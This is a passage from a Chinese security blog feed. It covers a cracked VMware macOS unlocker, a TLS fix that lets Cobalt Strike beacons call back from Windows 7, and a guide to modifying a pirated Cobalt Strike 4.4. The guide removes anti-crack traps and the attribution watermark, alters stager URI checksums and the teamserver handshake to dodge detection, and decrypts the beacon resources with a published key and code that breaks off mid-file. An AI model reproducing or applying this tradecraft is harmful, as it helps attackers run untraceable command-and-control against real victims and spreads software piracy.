os.path.isfile(vmx_stats):<br>        patchsmc(vmx_stats, vmx_so)<br><br>    <span class="hljs-comment"># Patch vmwarebase for Workstation and Player</span><br>    patchbase(vmwarebase)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><a href="http://extrtools.py">extrtools.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">需要提前手动创建tools目录，下载com.vmware.fusion.zip.tar保存到tools</span><br><span class="hljs-string">https://softwareupdate.vmware.com/cds/vmw-desktop/fusion/</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convertpath</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-comment"># OS path separator replacement funciton</span><br>    <span class="hljs-keyword">return</span> path.replace(os.path.sep, <span class="hljs-string">&#x27;/&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-comment"># Check minimal Python version is 2.7</span><br><span class="hljs-keyword">if</span> sys.version_info &lt; (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>):<br>sys.stderr.write(<span class="hljs-string">&#x27;[!] You need Python 3 or later\n&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><br>dest = os.path.dirname(os.path.abspath(__file__))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Extracting com.vmware.fusion.zip.tar...&#x27;</span>)<br>tar = tarfile.<span class="hljs-built_in">open</span>(convertpath(dest + <span class="hljs-string">&#x27;/tools/com.vmware.fusion.zip.tar&#x27;</span>), <span class="hljs-string">&#x27;r&#x27;</span>)<br>tar.extract(<span class="hljs-string">&#x27;com.vmware.fusion.zip&#x27;</span>, path=convertpath(dest + <span class="hljs-string">&#x27;/tools/&#x27;</span>))<br>tar.close()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Extracting files from com.vmware.fusion.zip...&#x27;</span>)<br>cdszip = zipfile.ZipFile(convertpath(dest + <span class="hljs-string">&#x27;/tools/com.vmware.fusion.zip&#x27;</span>), <span class="hljs-string">&#x27;r&#x27;</span>)<br>cdszip.extract(<span class="hljs-string">&#x27;payload/VMware Fusion.app/Contents/Library/isoimages/darwin.iso&#x27;</span>, path=convertpath(dest + <span class="hljs-string">&#x27;/tools/&#x27;</span>))<br>cdszip.extract(<span class="hljs-string">&#x27;payload/VMware Fusion.app/Contents/Library/isoimages/darwinPre15.iso&#x27;</span>, path=convertpath(dest + <span class="hljs-string">&#x27;/tools/&#x27;</span>))<br>cdszip.close()<br><br><span class="hljs-comment"># Move the iso and sig files to tools folder</span><br>shutil.move(convertpath(dest + <span class="hljs-string">&#x27;/tools/payload/VMware Fusion.app/Contents/Library/isoimages/darwin.iso&#x27;</span>), convertpath(dest + <span class="hljs-string">&#x27;/tools/darwin.iso&#x27;</span>))<br>shutil.move(convertpath(dest + <span class="hljs-string">&#x27;/tools/payload/VMware Fusion.app/Contents/Library/isoimages/darwinPre15.iso&#x27;</span>), convertpath(dest + <span class="hljs-string">&#x27;/tools/darwinPre15.iso&#x27;</span>))<br><br><span class="hljs-comment"># Cleanup working files and folders</span><br>shutil.rmtree(convertpath(dest + <span class="hljs-string">&#x27;/tools/payload&#x27;</span>), <span class="hljs-literal">True</span>)<br><span class="hljs-comment"># os.remove(convertpath(dest + &#x27;/tools/com.vmware.fusion.zip.tar&#x27;))</span><br>os.remove(convertpath(dest + <span class="hljs-string">&#x27;/tools/com.vmware.fusion.zip&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Tools retrieved successfully&#x27;</span>)<br><span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>完整UnlockerVMware16脚本包：<a href="https://wwp.lanzouy.com/ieZZz07axacd">https://wwp.lanzouy.com/ieZZz07axacd</a> 下载解压。</p><p>在win-install.cmd同级目录下创建 tools 文件夹，然后下载 vmware tools包，保存到tools目录下。</p><p>下载地址，官网很慢 <a href="https://softwareupdate.vmware.com/cds/vmw-desktop/fusion/12.2.3/19436697/x86/core/com.vmware.fusion.zip.tar">com.vmware.fusion.zip.tar</a></p><p>蓝奏云：<a href="https://wwp.lanzouy.com/b02df196h">https://wwp.lanzouy.com/b02df196h</a> 密码:1snz</p><p>分卷为7个压缩包，全部下载，删除后缀【.gz】，解压存放到tools目录。</p><p>以管理员权限运行 <code>win-install.cmd</code></p><p><img src="https://s1.ax1x.com/2022/07/03/j8RxuF.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/07/03/j8RjjU.png" alt=""></p><p>如需恢复破解，运行 <code>win-uninstall.cmd</code></p><p><img src="https://s1.ax1x.com/2022/07/03/j8RXcT.png" alt=""></p><p>Reference</p><p><a href="https://github.com/paolo-projects/unlocker">https://github.com/paolo-projects/unlocker</a></p>]]></content>
    
    
    <categories>
      
      <category>资源分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cracked</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于CS在Windows7无法上线问题</title>
    <link href="/posts/3bfe19c3.html"/>
    <url>/posts/3bfe19c3.html</url>
    
    <content type="html"><![CDATA[<p>复现漏洞时，CS 使用Listener为https时，在win 7上无法上线，以为是证书问题，重复换了证书还是不行，但在win 10上则正常。</p><h3 id="0x01-问题表现">0x01 问题表现</h3><p>主要表现为：</p><p>1、生成Windows分阶段Payload，打开exe会提示”xxx程序已停止“</p><p><img src="https://s1.ax1x.com/2022/04/17/LNUTfO.png" alt=""></p><p>2、Windows无阶段Payload，打开就只是打开了，没任何反应也无法上线。</p><h3 id="0x02-问题分析">0x02 问题分析</h3><p>wireshark 监控看看，走的是 TLSv1.2(TLS 1.0)？</p><p><img src="https://s1.ax1x.com/2022/04/17/LNUb1e.png" alt=""></p><p>从微软官方文档得知默认情况下windows 7并不支持，需要修改注册表手动开启支持 TLS 1.1和1.2…</p><p>但实战中不可能这么操作的。</p><p><a href="https://support.microsoft.com/zh-cn/topic/%E6%9B%B4%E6%96%B0%E4%BA%86-%E4%BB%A5%E5%9C%A8-windows-%E4%B8%AD%E7%9A%84-winhttp-%E4%B8%AD%E5%90%AF%E7%94%A8-tls-1-1-%E5%92%8C-tls-1-2-%E4%BD%9C%E4%B8%BA%E9%BB%98%E8%AE%A4%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE-c4bd73d2-31d7-761e-0178-11268bb10392">默认安全协议</a></p><p><img src="https://s1.ax1x.com/2022/04/17/LNUHpD.png" alt=""></p><p>其实，使用哪种通信协议版本是由服务端（CS）决定的，CS是用java运行的，那是否可以通过修改java默认TLS协议版本从而解决问题呢？</p><p>答案是，可以的。详细见 jdk文档 <a href="https://java.com/en/configure_crypto.html">https://java.com/en/configure_crypto.html</a></p><h3 id="0x03-解决方法">0x03 解决方法</h3><p>编辑文件 java.security  搜索 <code>jdk.tls.disabledAlgorithms</code></p><p>Windows 为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic">jdk1.<span class="hljs-number">8</span>.xxx\jre\lib\security\java.security<br>jre1.<span class="hljs-number">8.0</span>_xxx\lib\security\java.security<br>#jdk <span class="hljs-number">11</span>+<br>jdk-<span class="hljs-number">11</span>.xxx\conf\security\java.security<br></code></pre></td></tr></table></figure><p>Linux 为 ：<code>/etc/java-11-openjdk/security/java.security</code></p><p><code>C:\Program Files\Java\jdk-11.0.13\conf\security\java.security</code></p><p><img src="https://s1.ax1x.com/2022/04/17/LNUotK.png" alt=""></p><p>把 <code>SSLv3, TLSv1, TLSv1.1</code> ,删除，重新运行CS服务端即可。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>修改Cobalt Strike小记</title>
    <link href="/posts/324e2628.html"/>
    <url>/posts/324e2628.html</url>
    
    <content type="html"><![CDATA[<h2 id="CS-本身">CS 本身</h2><p>修改特征：watermark水印、Stager Url算法(checksum8)、Beacon Config密钥。</p><h3 id="0x01-反编译JAR包">0x01 反编译JAR包</h3><p>1、用IEDA中的 java-decompiler.jar(需要JDK 11+才可运行)来进行反编译CS。<br>jar包位于：plugins\java-decompiler\lib<br>Windows 下，即：C:\Program Files\JetBrains\IntelliJ IDEA 2020.3.2\plugins\java-decompiler\lib</p><p>2、原版CS 4.4 jar<br><a href="https://www.ddosi.org/cobaltstrike-4-4-csagent/">https://www.ddosi.org/cobaltstrike-4-4-csagent/</a><br><a href="https://github.com/trewisscotch/CobaltStr4.4/">https://github.com/trewisscotch/CobaltStr4.4/</a></p><p>目录结构：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic">D:\JAVAPROJECT\CS-CMPILATION<br>│  java-decompiler.jar<br>├─cs_bin # 原cs jar 目录<br>│      cobaltstrike.jar<br>└─cs_src # 反编译输出目录<br></code></pre></td></tr></table></figure><p>运行反编译命令</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dsg=true .\cs_bin\cobaltstrike.jar .\cs_src<br></code></pre></td></tr></table></figure><p>反编译完成后得到cs的java源码(cs_src\cobaltstrike.jar 是个zip需要解压。)</p><h3 id="0x02-环境搭建">0x02 环境搭建</h3><p>主要参考：</p><p><a href="https://pingmaoer.github.io/2020/06/24/CobaltStrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">https://pingmaoer.github.io/2020/06/24/CobaltStrike二次开发环境准备/</a></p><h4 id="新建-IDEA-项目">新建 IDEA 项目</h4><p>新建项目JDK选 1.8 ，选择低版本jdk是为了向上兼容。<br>项目创建后，在根目录新建俩文件夹：<code>decompiled_src</code> 和 <code>lib</code> 。decompiled_src 放反编译得到的所有源码文件，lib放原版cs jar包。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036219625-3f45166c-41da-4243-b959-f06ccda0f247.png" referrerPolicy="no-referrer" /><h4 id="设置项目结构">设置项目结构</h4><p>IDEA左上角 文件 &gt; 项目结构 &gt; 模块 &gt; 依赖 添加原版 cobaltstrike.jar</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036220147-59841a91-f4d9-4f14-95f4-62a99b3684d8.png" referrerPolicy="no-referrer" /><p><br/> 打勾启用</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036220578-b8f9b0aa-a386-4abf-aeef-88bdda384f32.png" referrerPolicy="no-referrer" /><p><br/> 设置入口 ，项目结构 &gt; 工件 &gt; JAR &gt; 来自具有依赖项的模块…</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036221088-1342a390-8235-4dbb-8aa5-134d4610b601.png" referrerPolicy="no-referrer" /><p><br/> Main-Class ：aggressor.Aggressor</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036221513-27dc9b4e-26ab-41bc-8e7b-4a6cfb484d0c.png" referrerPolicy="no-referrer" /><p><br/> 测试：src下新建软件包：aggressor，然后转到反编译完的aggressor中Aggressor.java，按F5，或者右键 重构 &gt; 复制文件 至 aggressor ，<strong>后续修改其他模块代码也是如此操作</strong>。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036221900-7827e08a-6103-426e-a7bd-56cc41c8fe7c.png" referrerPolicy="no-referrer" /><p><br/> 编辑 Aggressor.java 添加弹窗测试代码如：<code>JOptionPane.showMessageDialog(null,&quot;hello CS!!!&quot;);</code></p><p>生成jar包，菜单，构建 &gt; 构建工件，会在 out/artifacts/xx/ 下生成jar包。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036222300-a423bc4e-4166-486e-b7f7-6da149d75e09.png" referrerPolicy="no-referrer" /><h4 id="添加运行-调试配置">添加运行/调试配置</h4><p>jar路径：上面生成的jar包。虚拟机选项写 [-XX:+AggressiveHeap -XX:+UseParallelGC]</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036222608-7a2431af-e1a1-4dad-84fa-696733282be6.png" referrerPolicy="no-referrer" /><p><br/> 运行，报错了，找不到授权文件…</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036223182-7832bdef-30af-4fda-806c-cc8b7dc0d58c.png" referrerPolicy="no-referrer" /><p><br/> 下载 <a href="https://github.com/Twi1ight/CSAgent">https://github.com/Twi1ight/CSAgent</a> 解压复制到 out/artifacts/xx/ 下，跟构建出来的jar同级。</p><p>编辑 配置选项，追加虚拟机选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-javaagent:D:\JavaProject\ChangeCS\out\artifacts\ChangeCS_jar\CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en<br></code></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036223620-203873cd-e1da-4e79-81a1-85a562de45c1.png" referrerPolicy="no-referrer" /><p><br/> 不出意外运行后就结束退出了。。。</p><p>这是因为触发了暗桩 ：<a href="https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#%E5%8E%BB%E9%99%A4%E6%9A%97%E6%A1%A9">去除暗桩</a></p><h3 id="0x03-去除暗桩">0x03 去除暗桩</h3><p>通过IDEA复制 beacon/BeaconData.java 到项目src下，将shouldPad方法的值改为false</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036224310-258aec27-6ddb-4f13-95e8-ea902e61ef3c.png" referrerPolicy="no-referrer" /><p><br/> 注释 common/Helper.java 31~51行。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036224687-58a14ed8-48a0-495b-8019-a7065a9407e2.png" referrerPolicy="no-referrer" /><p><br/> common/Starter.java 11~13行。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036225363-9b7b1890-635d-4f9c-86c2-472610a7fc50.png" referrerPolicy="no-referrer" /><p><br/> common/Starter2.java 12~14行。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036225743-1e8df97d-4e78-4747-8e24-570856039133.png" referrerPolicy="no-referrer" /><p><br/> 重新构建，即可正常运行，弹出hello CS，确定后出现CS登录页面。</p><h3 id="0x04-去除水印">0x04 去除水印</h3><p>修改 common/ListenerConfig.java ，注释掉49行，添加 <code>var3.append((char)CommonUtils.rand(255));</code> <br/></p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036226432-60d545e6-3a0e-4f02-8992-15264d818d02.png" referrerPolicy="no-referrer" /><h3 id="0x05-修改stager">0x05 修改stager</h3><p>checksum8 脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoSum</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">checksum8</span><span class="hljs-params">(String text)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text.length() &lt; <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>;<br>        &#125;<br>        text = text.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0L</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; x &lt; text.length(); x++) &#123;<br>            sum += text.charAt(x);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;x86: &quot;</span> + checksum8(<span class="hljs-string">&quot;f796xxx.js&quot;</span>)); <span class="hljs-comment">// 可自行修改</span><br>        System.out.println(<span class="hljs-string">&quot;x64: &quot;</span> + checksum8(<span class="hljs-string">&quot;dd83xxx.js&quot;</span>)); <span class="hljs-comment">// 可自行修改</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.tutorialspoint.com/compile_java_online.php">https://www.tutorialspoint.com/compile_java_online.php</a></p><p>运行得到：1270、1396</p><p>修改 cloudstrike/webserver.java 175、179、183行，替换，以及删除183行的 &amp;&amp; uri.matches(“/[A-Za-z0-9]{4}”)</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036226859-60ebdf43-b89e-4e87-862b-e1fba03bdd43.png" referrerPolicy="no-referrer" /><p><br/> 添加个判断，防止不规范路径泄露stage以及修复log4j2漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!uri.startsWith(<span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.processResponse(uri, method, header, param, <span class="hljs-literal">false</span>, (WebService)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;400 Bad Request&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036227854-66f4db9f-e5d9-465d-aeac-ee9440c5b948.png" referrerPolicy="no-referrer" /><p><br/> 修改 common/CommonUtils.java</p><p>1385行 return var2.toString(); 为 return “f796xxx.js;”, 1400行 return var1; 为 return dd83xxx.js;</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036228971-7d50708d-7e2a-4634-b1d1-b980d36e4a78.png" referrerPolicy="no-referrer" /><p><br/> 重新构建jar包会报错，删除报错变量：int len$;、String[] 、WebService service; 即可。</p><h3 id="0x06-修改服务登录接口">0x06 修改服务登录接口</h3><p>修改 teamserver登录接口，防爆破。</p><p>在当前项目src新建软件包ssl ，然后 通过IDEA 复制反编译出来的 ssl/SecureServerSocket.java 和 ssl/SecureSocket.java 到当前项目src/ssl下，修改 48879 为其他数字值。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036229733-419ab755-eb94-4df4-a343-40acfe0cce74.png" referrerPolicy="no-referrer" /><h3 id="0x07-解密sleeve资源">0x07 解密sleeve资源</h3><p>用jas502大佬的 <a href="https://github.com/jas502n/cs_file_decrypt">cs_file_decrypt</a> 解密 sleeve下的dll资源文件。</p><p>需要注意的是 CrackSleeve.java 密钥是其他版本CS的，需要修改为 当前版本的。</p><p><a href="https://github.com/lovechoudoufu/cobaltstrike4.4_cdf#%E7%A0%B4%E8%A7%A3%E6%96%B9%E5%BC%8F">cobaltstrike4.4破解方式</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">94</span>, -<span class="hljs-number">104</span>, <span class="hljs-number">25</span>, <span class="hljs-number">74</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">58</span>, -<span class="hljs-number">76</span>, -<span class="hljs-number">113</span>, -<span class="hljs-number">91</span>, -<span class="hljs-number">126</span>, -<span class="hljs-number">90</span>, -<span class="hljs-number">87</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69</span>, -<span class="hljs-number">110</span>, -<span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>完整 CrackSleeve.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> common.*;<br><span class="hljs-keyword">import</span> dns.SleeveSecurity;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><span class="hljs-keyword">import</span> java.util.jar.JarEntry;<br><span class="hljs-keyword">import</span> java.util.jar.JarFile;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CrackSleeve</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OriginKey = &#123;<span class="hljs-number">94</span>, -<span class="hljs-number">104</span>, <span class="hljs-number">25</span>, <span class="hljs-number">74</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">58</span>, -<span class="hljs-number">76</span>, -<span class="hljs-number">113</span>, -<span class="hljs-number">91</span>, -<span class="hljs-number">126</span>, -<span class="hljs-number">90</span>, -<span class="hljs-number">87</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">69</span>, -<span class="hljs-number">110</span>, -<span class="hljs-number">42</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CustomizeKey = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">DecDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cs44Resource/Decode/sleeve&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">EncDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cs44Resource/Encode/sleeve&quot;</span>;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-type">char</span>[] hex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">32</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">di</span> <span class="hljs-operator">=</span> data[i];<br>            hex[i &lt;&lt; <span class="hljs-number">1</span>] = Character.forDigit((di &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">15</span>, <span class="hljs-number">16</span>);<br>            hex[(i &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>] = Character.forDigit(di &amp; <span class="hljs-number">15</span>, <span class="hljs-number">16</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(hex);<br>    